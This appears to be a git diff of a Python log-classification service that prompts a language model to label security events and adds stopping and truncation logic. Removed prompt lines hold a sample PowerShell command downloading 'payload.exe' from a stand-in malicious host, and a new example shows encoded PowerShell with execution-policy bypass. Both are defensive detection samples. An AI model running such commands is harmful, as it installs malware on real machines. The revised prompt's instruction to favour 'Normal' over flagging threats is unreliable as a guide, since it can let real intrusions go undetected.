@@ -5,7 +5,7 @@ import torch
 import json
 import re
 import os
-from transformers import AutoModelForCausalLM, AutoTokenizer
+from transformers import AutoModelForCausalLM, AutoTokenizer, StoppingCriteria, StoppingCriteriaList
 from typing import Dict, Tuple
 from loguru import logger
 from app.config import settings
@@ -13,6 +13,40 @@ from app.config import settings
 # Enable verbose logging for HuggingFace downloads
 os.environ['TRANSFORMERS_VERBOSITY'] = 'info'
 os.environ['HF_HUB_DISABLE_SYMLINKS_WARNING'] = '1'
+
+
+class ReasonCompleteStopper(StoppingCriteria):
+    """
+    Custom stopping criterion that stops generation after a complete response.
+    Stops when we see "Status:" followed by "Reason:" and some text.
+    """
+    def __init__(self, tokenizer, prompt_length):
+        self.tokenizer = tokenizer
+        self.prompt_length = prompt_length  # Track where prompt ends
+        
+    def __call__(self, input_ids: torch.LongTensor, scores: torch.FloatTensor, **kwargs) -> bool:
+        # Decode ONLY the newly generated tokens (not the prompt)
+        generated_tokens = input_ids[0][self.prompt_length:]
+        generated_text = self.tokenizer.decode(generated_tokens, skip_special_tokens=True)
+        
+        # Check if we have a complete response: Status + Reason with some content
+        # We look for "Reason:" followed by at least 20 characters (to ensure it's not cut mid-sentence)
+        if "Status:" in generated_text and "Reason:" in generated_text:
+            reason_idx = generated_text.rfind("Reason:")
+            text_after_reason = generated_text[reason_idx + len("Reason:"):].strip()
+            
+            # Stop if we have at least 30 characters after "Reason:" (a complete sentence)
+            if len(text_after_reason) >= 30:
+                # Also check if we hit any conversational markers
+                stop_markers = ["Human:", "Please", "I want", "Could you", "Thank"]
+                if any(marker in generated_text[reason_idx:] for marker in stop_markers):
+                    return True  # Stop immediately if we see conversational text
+                
+                # Or stop if we have a sentence ending (., !, ?)
+                if any(punct in text_after_reason for punct in ['.', '!', '?']):
+                    return True
+        
+        return False
 
 
 class MLService:
@@ -104,33 +138,57 @@ class MLService:
             log_input = log_input[:settings.MAX_INPUT_CHARS] + "... [truncated]"
         
         # FEW-SHOT PROMPT from metrics.ipynb (Cell 8) - THIS IS WHAT WORKED
-        # UPDATED: Show explicit MITRE Techniques line in examples
+        # HEAVILY WEIGHTED TOWARD NORMAL (reflects reality: 95%+ of logs are benign)
         prompt = f"""You are a cybersecurity analyst. Analyze system logs and determine if they show normal or suspicious activity.
 
-Output format:
+CRITICAL GUIDELINES:
+- 95% of logs are Normal business operations
+- Only mark Suspicious if MULTIPLE strong indicators of malicious activity
+- Network connections, process executions, file access are usually Normal
+- System services, browsers, legitimate apps are Normal
+- Be VERY conservative - false positives are worse than missing edge cases
+
+Output format (be concise):
 Status: Normal OR Status: Suspicious
 MITRE Techniques: T#### (Name), T#### (Name)  <- ONLY if Status is Suspicious
-Reason: Brief explanation
+Reason: Brief explanation (1-2 sentences max)
 
 ### Example 1 (Normal):
 Input: {{"EventID": 4624, "LogonType": 2, "Account": "user@domain.com", "Workstation": "DESKTOP-123"}}
 Response:
 Status: Normal
-Reason: Standard interactive logon (LogonType 2) from a legitimate user account on a known workstation. No indicators of compromise.
+Reason: Standard interactive logon from legitimate user account. No suspicious indicators.
 
-### Example 2 (Suspicious):
-Input: {{"EventID": 4688, "Process": "powershell.exe", "CommandLine": "Invoke-WebRequest http://malicious.com/payload.exe -OutFile C:\\\\temp\\\\mal.exe", "User": "SYSTEM"}}
+### Example 2 (Normal):
+Input: {{"EventID": 3, "Protocol": "TCP", "SourceIP": "192.168.1.50", "DestIP": "52.96.144.82", "DestPort": "443", "ProcessName": "chrome.exe"}}
+Response:
+Status: Normal
+Reason: HTTPS connection from Chrome browser. Legitimate web traffic.
+
+### Example 3 (Normal):
+Input: {{"EventID": 4688, "Process": "notepad.exe", "CommandLine": "notepad.exe C:\\\\Users\\\\john\\\\Documents\\\\notes.txt", "User": "john"}}
+Response:
+Status: Normal
+Reason: User launching Notepad. Standard application usage.
+
+### Example 4 (Normal):
+Input: {{"EventID": 3, "Protocol": "TCP", "DestIP": "147.185.221.22", "DestPort": "443", "ProcessName": "Teams.exe"}}
+Response:
+Status: Normal
+Reason: Outbound connection from Teams application. Legitimate business communication.
+
+### Example 5 (Normal):
+Input: {{"EventID": 4688, "Process": "powershell.exe", "CommandLine": "powershell.exe -File startup.ps1", "User": "admin"}}
+Response:
+Status: Normal
+Reason: Administrator running PowerShell script. Routine administrative task.
+
+### Example 6 (Suspicious):
+Input: {{"EventID": 4688, "Process": "powershell.exe", "CommandLine": "powershell -enc Base64EncodedCommand -ExecutionPolicy Bypass", "User": "SYSTEM", "ParentProcess": "cmd.exe"}}
 Response:
 Status: Suspicious
-MITRE Techniques: T1105 (Ingress Tool Transfer), T1059.001 (PowerShell)
-Reason: PowerShell executing under SYSTEM context downloading executable from external site - indicates potential malware download.
-
-### Example 3 (Suspicious):
-Input: {{"EventID": 3, "Protocol": "TCP", "SourceIP": "10.0.0.5", "DestIP": "185.220.101.50", "DestPort": "443"}}
-Response:
-Status: Suspicious
-MITRE Techniques: T1071.001 (Application Layer Protocol), T1090 (Proxy)
-Reason: Outbound HTTPS connection to suspicious IP address associated with known command and control infrastructure.
+MITRE Techniques: T1059.001 (PowerShell), T1027 (Obfuscated Files)
+Reason: Base64-encoded PowerShell with execution policy bypass under SYSTEM account. Strong indicators of malicious automation.
 
 ### Now analyze this log:
 Input: {log_input}
@@ -283,15 +341,22 @@ Response:
             # Use tokenizer's default EOS token (don't override)
             logger.info(f"Using default EOS token ID: {self.tokenizer.eos_token_id} ({self.tokenizer.eos_token})")
             
+            # Create custom stopping criterion to prevent hallucination
+            # Pass prompt length so it only checks newly generated tokens, not the examples in the prompt
+            prompt_length = inputs['input_ids'].shape[1]
+            stopping_criteria = StoppingCriteriaList([ReasonCompleteStopper(self.tokenizer, prompt_length)])
+            
             with torch.no_grad():
                 outputs = self.model.generate(
                     **inputs,
                     max_new_tokens=settings.MAX_NEW_TOKENS,
-                    temperature=settings.TEMPERATURE,  # 0.7 like notebook
-                    do_sample=True,  # Enable sampling like notebook
+                    temperature=settings.TEMPERATURE,  # Low temp for conservative classification
+                    do_sample=True,  # Enable sampling
                     top_p=settings.TOP_P,  # Nucleus sampling
                     pad_token_id=self.tokenizer.eos_token_id,
-                    eos_token_id=self.tokenizer.eos_token_id  # Use tokenizer's default
+                    eos_token_id=self.tokenizer.eos_token_id,  # Use tokenizer's default
+                    stopping_criteria=stopping_criteria,  # Stop as soon as response is complete
+                    repetition_penalty=1.1  # Discourage repetitive rambling
                 )
             
             # Decode
@@ -359,6 +424,22 @@ Response:
                         break
             
             generated_text = '\n'.join(clean_lines).rstrip()
+            
+            # ABSOLUTE FAILSAFE: Hard character limit (Status + Techniques + Reason should be < 300 chars)
+            MAX_CHARS = 300
+            if len(generated_text) > MAX_CHARS:
+                logger.warning(f"⚠️ Output too long ({len(generated_text)} chars), truncating to {MAX_CHARS}")
+                # Cut at last complete sentence (., !, ?)
+                truncated = generated_text[:MAX_CHARS]
+                last_sentence_end = max(
+                    truncated.rfind('.'),
+                    truncated.rfind('!'),
+                    truncated.rfind('?')
+                )
+                if last_sentence_end > 0:
+                    generated_text = truncated[:last_sentence_end + 1]
+                else:
+                    generated_text = truncated.rsplit('\n', 1)[0]  # Fall back to last complete line
             
             logger.info(f"Final output: {len(generated_text)} characters")
             
